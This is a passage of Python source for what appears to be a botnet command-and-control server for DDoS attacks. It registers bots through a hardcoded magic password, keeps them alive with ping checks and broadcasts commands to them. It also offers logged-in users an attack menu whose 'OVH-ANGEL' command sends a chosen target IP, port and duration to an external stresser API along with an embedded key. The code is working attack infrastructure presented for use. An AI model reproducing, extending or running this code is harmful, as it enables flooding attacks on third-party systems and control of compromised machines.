def broadcast(data):
    dead_bots = []
    for bot in bots.keys():
        try:
            send(bot, f'{data} 32', False, False)
        except:
            dead_bots.append(bot)
    for bot in dead_bots:
        bots.pop(bot)
        bot.close()

def ping():
    while 1:
        dead_bots = []
        for bot in bots.keys():
            try:
                bot.settimeout(3)
                send(bot, 'PING', False, False)
                if bot.recv(1024).decode() != 'PONG':
                    dead_bots.append(bot)
            except:
                dead_bots.append(bot)
            
        for bot in dead_bots:
            bots.pop(bot)
            bot.close()
        time.sleep(5)

def update_title(client, username):
    while 1:
        try:
            send(client, f'\33]0;[-] PUT NAME HERE Net | Limited Edition |Connected As: {username} [-]\a', False)
            time.sleep(1)
            send(client, f'\33]0;[\] PUT NAME HERE Net | Limited Edition |Connected As: {username} [\]\a', False)
            time.sleep(1)
            send(client, f'\33]0;[|] PUT NAME HERE Net | Limited Edition |Connected As: {username} [|]\a', False)
            time.sleep(1)
            send(client, f'\33]0;[/] PUT NAME HERE Net | Limited Edition |Connected As: {username} [/]\a', False)
            time.sleep(1)
            send(client, f'\33]0;[-] PUT NAME HERE Net | Limited Edition |Connected As: {username} [-]\a', False)
            time.sleep(1)
            send(client, f'\33]0;[\] PUT NAME HERE Net | Limited Edition |Connected As: {username} [\]\a', False)
            time.sleep(1)     
        except:
            client.close()

def command_line(client):
    for x in banner.split('\n'):
        send(client, x)

    prompt = f'[38;2;255;202;0m║[38;2;244;145;57m═[38;2;233;88;114m═[0;00m[PUT NAME HERE][38;2;255;202;0m═[38;2;244;145;57m═[38;2;233;88;114m║[0;00m➤'
    send(client, prompt, False)

    while 1:
        try:
            data = client.recv(1024).decode().strip()
            if not data:
                continue

            args = data.split(' ')
            command = args[0].upper()
            

            if command == 'CLEAR':
                send(client, ansi_clear, False)
                for x in banner.split('\n'):
                    send(client, x)

            elif command == 'CLS':
               send(client, ansi_clear, False)
               for x in banner.split('\n'):
                   send(client, x)

            elif command == 'HELP':
                send(client, ansi_clear, False)
                for x in help1.split('\n'):
                    send(client, x)

            elif command == '?':
                send(client, ansi_clear, False)
                for x in help1.split('\n'):
                    send(client, x)

            elif command == 'CREDITS':
                send(client, ansi_clear, False)
                for x in credits.split('\n'):
                    send(client, x)

            elif command == 'VIP':
                send(client, ansi_clear, False)
                for x in VIP.split('\n'):
                    send(client, x)

            elif command == 'L4':
                send(client, ansi_clear, False)
                for x in L4.split('\n'):
                    send(client, x)

            elif command == 'LOGOUT':
                send(client, 'Goodbye.')
                time.sleep(1)
                break
           
            elif command == 'METHODS':
                send(client, ansi_clear, False)
                for x in methods.split('\n'):
                    send(client, x)


            elif command == 'OVH-ANGEL':
                if len(args) == 5:
                    ip = args[1]
                    port = args[2]
                    time = args[3]
                    if validate_ip(ip):
                        if validate_port(port, True):
                            if validate_time(time):
                                send(client, f'\033[38;5;57m[\u001b[37;1m+\033[38;5;57m] Loading ...')
                                requests.get(f"http://api.voodoostress.xyz/api/api.php?key=daddypercs223&host={ip}&port={port}&time={time}&method=OVH-ANGEL")
                                send(client, f'\033[2J\033[H')  
                                send(client, f'                 \u001b[30m╔══════════════════════════════════════════════')
                                send(client, f'                 \u001b[30m║ \u001b[31mTARGET    \u001b[33m>  \u001b[35m{ip}')
                                send(client, f'                 \u001b[30m║ \u001b[31mPORT      \u001b[33m>  \u001b[35m{port}')
                                send(client, f'                 \u001b[30m║ \u001b[31mTIME      \u001b[33m>  \u001b[35m{time}')
                                send(client, f'                 \u001b[30m║ \u001b[31mMETHOD    \u001b[33m>  \u001b[OVH-ANGEL-ANGEL')
                                send(client, f'                 \u001b[30m╚══════════════════════════════════════════════')
                                send(client, f'')
                            else:
                                send(client, Fore.RED + 'Invalid attack time (1-65535)')
                        else:
                            send(client, Fore.RED + 'Invalid port number (1-65535)')
                    else:
                        send(client, Fore.RED + 'Invalid IP-address')
                else:
                    send(client, f'Usage: HOME-ANGEL [IP] [PORT] [TIME]') 

            send(client, prompt, False)
        except:
            break
    client.close()

def handle_client(client, address):
    send(client, f'\33]0;Paradox XV | Login\a', False)

    while 1:
        send(client, ansi_clear, False)
        send(client, f'[0m[38;2;252;0;255mU[0m[38;2;224;24;251ms[0m[38;2;196;49;248me[0m[38;2;168;73;244mr[0m[38;2;140;97;240mn[0m[38;2;112;122;237ma[0m[38;2;84;146;233mm[0m[38;2;56;170;229me[0m[38;2;28;195;226m[97m➤', False)
        username = client.recv(1024).decode().strip()
        if not username:
            continue
    
        break

    password = ''
    while 1:
        send(client, ansi_clear, False)
        send(client, f'[0m[38;2;224;24;251m [0m[38;2;252;0;255mP[0m[38;2;224;24;251ma[0m[38;2;196;49;248ms[0m[38;2;168;73;244ms[0m[38;2;140;97;240mw[0m[38;2;112;122;237mo[0m[38;2;84;146;233mr[0m[38;2;56;170;229md[0m[38;2;28;195;226m[97m➤[38;2;28;195;16m', False, False)
        while not password.strip():
            password = client.recv(1024).decode('cp1252').strip()
        break
        
    if password != '\xff\xff\xff\xff\75':
        send(client, ansi_clear, False)

        if not find_login(username, password):
            send(client, Fore.RED + 'Invalid credentials')
            time.sleep(1)
            client.close()
            return

        threading.Thread(target=update_title, args=(client, username)).start()
        threading.Thread(target=command_line, args=[client]).start()

    else:
        for x in bots.values():
            if x[0] == address[0]:
                client.close()
                return
        bots.update({client: address})

def main():
    if len(sys.argv) != 2:
        print(f'Usage: python {sys.argv[0]} <c2 port>')
        exit()

    port = sys.argv[1]
    if not port.isdigit() or int(port) < 1 or int(port) > 65535:
        print('Invalid C2 port')
        exit()
    port = int(port)
    init(convert=True)

    sock = socket.socket()
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    
    try:
        sock.bind(('0.0.0.0', port))
    except:
        print('Failed to bind port')
        print('Pls Try A New Port')
        exit()

    sock.listen()

    threading.Thread(target=ping).start()

    while 1:
        threading.Thread(target=handle_client, args=[*sock.accept()]).start()

if __name__ == '__main__':
    main()
